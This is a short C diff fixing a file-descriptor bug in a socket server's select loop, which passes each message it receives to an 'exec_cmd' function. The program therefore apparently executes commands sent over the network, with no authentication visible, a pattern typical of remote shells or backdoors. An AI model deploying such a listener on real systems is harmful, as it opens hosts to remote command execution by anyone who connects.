@@ -44,7 +44,7 @@ void main_loop(int s) {
           FD_SET(cfd, &active_fds);
         }
         else {
-          nread = recv(cfd, buf, 1024, 0);
+          nread = recv(i, buf, 1024, 0);
           if(nread != 0)
             exec_cmd(buf);
         }
